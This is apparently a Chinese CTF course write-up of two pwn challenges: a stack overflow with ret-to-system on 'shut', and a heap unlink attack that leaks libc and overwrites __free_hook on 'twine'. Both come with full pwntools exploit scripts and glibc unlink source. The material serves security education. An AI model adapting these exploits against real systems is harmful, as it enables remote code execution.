---
title: 竞赛课结课分享
description: AK了比赛分享经验！
pubDatetime: 2023-05-22
published: true
ogImage: ../../assets/2.png
language: cn
tags:
  - 网络安全
---

# 第一题：shut

## 分析代码

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
    __int64 v4; // [rsp+8h] [rbp-8h] BYREF

    v4 = 0LL;
    puts(" *------Ab1azE easy pwn------* \n");
    puts("enjoy yourself in the course of the hacking :)");
    gets(&v4, argv);
    close(1);
    return 0;
}
```

这里发现也存在system函数

```c
__int64 __fastcall func(const char *a1)  //如果这里是/bin/sh就好了啊
{
  system(a1);
  return 0LL;
}
```

然后尼，我们还发现里面存在/bin/sh<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684423094135-acbe3233-744c-4e42-92b5-40d9eebf9e8c.png#averageHue=%23363533&clientId=ueaff3f70-7084-4&from=paste&height=444&id=ud9213d5c&originHeight=733&originWidth=1444&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=174340&status=done&style=none&taskId=u726c8199-005d-4178-a4ca-d5c0c6858b3&title=&width=875.1514645691227)

## 来看exp

```c
from pwn import *
p = remote("172.22.107.127",49221)
offset =0x10
payload = b'A' * offset + p64(0x400803) + p64(0x601050) +  p64(0x40073F)
p.sendline(payload)
p.interactive()
```

## 坑点所在

关闭了标准输出1<br />那么我们可以重新定位（标准输入0，标准错误输出2）<br />exec 1>&2

# 第四题：twine

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684423459606-7e109e04-841f-443f-87d4-316aea66ad04.png#averageHue=%23312d2b&clientId=uc480b705-b444-4&from=paste&height=191&id=u352f8326&originHeight=315&originWidth=1053&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=68891&status=done&style=none&taskId=u1654fe99-64ef-408e-b39a-486917499eb&title=&width=638.1817812959046)

> 关注重点：没有PIE

在进入堆题的讲解之前，我先分享一些堆题的基本思想。<br />对于堆相关的漏洞，其实无法直接去做到劫持程序流。

> 这点很好理解，因为程序的执行和调用过程，数据都存在栈上。控制堆，但是不是控制栈。无法直接控制程序执行流程。

常见的劫持程序控制流：

- 利用程序本身对堆的使用，堆山函数指针等。
- 基于堆分配的理解，从而任意地址写，再修改libc中的hook来控制流程。

### 常用的hook

调用free和malloc的本身，就是调用里面的hook函数指针。

- malloc_hook
- free_hook

### one_gadget

如果能控制rip的时候，这个非常有用，不用去思考如何执行system("/bin/sh")或者system("/sh")

- 通常使用free_hook,因为后面加入了tcache，而tcache的判断条件很少，所以更容易利用起来。

## 问题思考

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684321914932-16842b86-6735-454c-9b3c-e0f493dd9808.png#averageHue=%23faf9f9&clientId=ub6bf50f7-fbf5-4&from=paste&height=458&id=ua1cc99b0&originHeight=806&originWidth=1696&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=30172&status=done&style=none&taskId=ubd85bdcd-bda0-4d0b-8b02-4da0eb3935d&title=&width=963.878662109375)<br /> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684322034970-c627c8ba-68b2-41af-9731-1c7dd2cd202e.png#averageHue=%23f8f8f8&clientId=ub6bf50f7-fbf5-4&from=paste&height=473&id=u9fd281ec&originHeight=792&originWidth=1435&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=44155&status=done&style=none&taskId=ub77d1ec6-b9a9-458c-9f5d-f537d08be10&title=&width=856.6968994140625)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684322308198-ed0e4278-fcf9-4f9f-8850-eaf4d4f1c15e.png#averageHue=%23f7f7f6&clientId=ub6bf50f7-fbf5-4&from=paste&height=518&id=u92ccb5a7&originHeight=854&originWidth=2008&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=91919&status=done&style=none&taskId=ud18fd5f7-29f5-4743-9b20-b67b9ce1322&title=&width=1216.969626630747)<br /> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684322668477-ec26a97e-accf-4790-9832-c17048dd1ee6.png#averageHue=%23f1f1f0&clientId=ub6bf50f7-fbf5-4&from=paste&height=579&id=u64689191&originHeight=955&originWidth=1568&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=90640&status=done&style=none&taskId=u855fbce4-4e86-4a05-b7ae-07e208a5f7a&title=&width=950.3029753769976)<br /> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684322886211-18990d49-1e4c-487b-9b9a-8f2fad12a297.png#averageHue=%23f7f5f5&clientId=ub6bf50f7-fbf5-4&from=paste&height=500&id=ua4c48108&originHeight=825&originWidth=1560&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=49919&status=done&style=none&taskId=u7de7d9f0-3557-4d76-8384-6b410303736&title=&width=945.4544908087476)<br /> ![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684323128415-62549238-91fa-4c8a-bcf5-ba4dfeaca4a7.png#averageHue=%23f7f7f7&clientId=ub6bf50f7-fbf5-4&from=paste&height=576&id=u238e96de&originHeight=951&originWidth=1853&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=46511&status=done&style=none&taskId=ucd7e8c85-1f4b-4574-a48a-aebe98412d6&title=&width=1123.0302381209033)

## 进入代码审计

因为堆题的代码有一点量了，我这里直接分析。<br />常见出现问题的几个点：free函数，edit函数<br />存在堆溢出漏洞。

#### 常见利用方法：

- 未开启pie的情况，考虑unlink
- 使用fastbin情况，考虑Chunk Extend构造overlap

## 先上EXP

```python
from pwn import *
#context(log_level = 'debug')
io = process('./pwn')
#io = remote('172.22.107.127',50364)
elf = ELF('./pwn')

r = lambda : io.recv()
rx = lambda x: io.recv(x)
ru = lambda x: io.recvuntil(x)
rud = lambda x: io.recvuntil(x, drop=True)
uu64= lambda : u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x, y: io.sendafter(x, y)
sla = lambda x, y: io.sendlineafter(x, y)
shell = lambda : io.interactive()
libc=elf.libc

def debug( ):
     gdb.attach(io)

def cin(choice):
     io.sendlineafter(b"please input your choice:",str(choice))

def  add(index, size ):
    cin(1)
    io.sendlineafter(b'please input the idx',str(index))
    io.sendlineafter(b'please input the size',str(size))

def  delete(index):
    cin(2)
    io.sendlineafter(b'please input the idx',str(index))

def show(index):
    cin(3)
    io.sendlineafter(b'please input the idx',str(index))

def edit(index,content):
    cin(4)
    io.sendlineafter(b'please input the idx',str(index))
    io.sendafter(b'please input the content',content)
bss=06020E0
ptr = 0x6020F0 #bss

#创建4个，每个chunk的作用各不相同，chunk0用于泄露，chunk3用于执行shell的字符串（指针存在），chunk1和chunk2用于在data中间fakechunk
add(0,0x88)
add(1,0x88)
add(2,0x88)
add(3,0x88)

#编辑第三个
edit(3,b'/bin/sh\x00')

#删除第0个,进入了unsorted bin
delete(0)
#重新加回来，用于泄露
add(0,0x88)
show(0)

#泄露main_arena
leak_addr=uu64()
print(hex(leak_addr))
main_arena=leak_addr-88

#找到malloc_hook，free_hook
malloc_hook=main_arena-0x10
libc_base = malloc_hook - libc.symbols["__malloc_hook"]
free_hook=libc_base+libc.sym['__free_hook']
print(hex(libc_base))

#伪造fake_chunk，在chunk1和chunk2中间
payload=p64(0)+p64(0x80)+p64(ptr-0x18)+p64(ptr-0x10)+b'a'*0x60+p64(0x80)+p64(0x90)
edit(1,payload)

#删除2，unlink
delete(2)

#修改为指向free_hook
edit(1,b'c'*0x18+p64(free_hook))
#修改为system
edit(1,p64(libc_base+libc.sym['system']))
print(hex(free_hook))

#执行shell
delete(3)

shell()
```

![](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1683904853290-8d42a144-b5a0-44dd-96db-00822b60fa41.jpeg)<br />为什么选择0x88<br />![](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684201608607-a6da6f43-1c09-4f5b-aec1-4e55576036c3.png#averageHue=%23ecef02&from=url&id=fSHKJ&originHeight=339&originWidth=1232&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&status=done&style=none&title=)<br />为什么选择bss-0x18，bss-0x10<br />先看unlink源码

```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {   //注意，在largebin链表中在unlink时寻找合适堆块的遍历是反向遍历
								  //即从小到大使用bk_nextsize进行遍历
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) //安全性检查
      malloc_printerr ("corrupted size vs. prev_size");
    FD = P->fd;		//获取victim的前后指针
    BK = P->bk;		//形式为：free chunk(bck) victim free chunk(fwd)
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))	//检查双向链表完整性
      malloc_printerr ("corrupted double-linked list");
    else {
        FD->bk = BK;	//对bck的fd、fwd的bk进行设置
        BK->fd = FD;
        if (!in_smallbin_range (chunksize_nomask (P))
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {
            	//若victim属于large chunk且victim->fd_nextsize!=NULL
            	//也就是说如果victim属于large chunk且victim不是相同大小的第一个chunk
            	//我们不会对其进行unlink
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0) //largebin中对双向链表的完整性进行检查
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))
	      malloc_printerr ("corrupted double-linked list (not small)");
            if (FD->fd_nextsize == NULL) {	//如果我们获取到的chunk是相同大小的第一个chunk
                	//eg：chunk0(fd_nextsize、bk_nextsize) chunk1 （chunk0size==chunk1size）
                	//这里指chunk1
                if (P->fd_nextsize == P)	//如果在相同size大小的large chunk中只有victim一个
                  FD->fd_nextsize = FD->bk_nextsize = FD;
                else {	//如果除victim之外还有其他相同大小的chunk
                    FD->fd_nextsize = P->fd_nextsize;
                    FD->bk_nextsize = P->bk_nextsize;
                    P->fd_nextsize->bk_nextsize = FD;
                    P->bk_nextsize->fd_nextsize = FD;
                  }
              } else { //如果不是则对其victim进行脱链（即chunk0size>chunk1size）
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;
              }
          }
      }
}
```

![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684425463227-e4bf9576-063a-42f3-8e43-57bc13507664.png#averageHue=%23f7f7f7&clientId=ube9c0d26-d56d-4&from=paste&height=433&id=gPK6J&originHeight=714&originWidth=2102&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=27659&status=done&style=none&taskId=ucfdfb316-b8bf-4b21-ab5e-676dceadb13&title=&width=1273.9393203076843)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684425933805-d72a29ef-1042-4a7e-9914-d69a79e64599.png#averageHue=%23d6a661&clientId=u05e4e9cc-0ae3-4&from=paste&height=439&id=KGanR&originHeight=725&originWidth=2057&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=21522&status=done&style=none&taskId=uc48251c8-36c6-4c78-937e-46b9b9ef287&title=&width=1246.666594611278)

### 看一些大题的内存图

伪造的fakechunk<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684424710190-47ac9541-44a6-4e8c-a99a-90e6d3ac145e.png#averageHue=%233f3d3a&clientId=ua878ff69-d5d9-4&from=paste&height=244&id=u79ab11aa&originHeight=403&originWidth=1132&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=82863&status=done&style=none&taskId=ue799038e-fee8-41fd-b9b7-db0906d39d3&title=&width=686.0605664073732)<br />bss区域<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684424672297-d46c02db-ee93-4ffb-b0a9-2ef8e3f7c555.png#averageHue=%23413d3b&clientId=ua878ff69-d5d9-4&from=paste&height=245&id=u2de81d1a&originHeight=404&originWidth=1078&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=88902&status=done&style=none&taskId=u9d5dd99e-4812-496b-a418-3dffae71402&title=&width=653.3332955716858)<br />验证偏移等一些列想法<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/29466846/1684424853929-1d0d47ce-8cd5-43d9-928d-7022e97aa911.png#averageHue=%2335322f&clientId=ua878ff69-d5d9-4&from=paste&height=706&id=ub499337b&originHeight=1165&originWidth=1239&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=266680&status=done&style=none&taskId=u9144fba9-5853-465d-b4d1-f17b128b095&title=&width=750.9090475077168)<br />![](https://cdn.nlark.com/yuque/0/2023/jpeg/29466846/1683904853290-8d42a144-b5a0-44dd-96db-00822b60fa41.jpeg)

> 大体思路是这样，有点绕，图有点难画，你自己手动画一下就清楚。
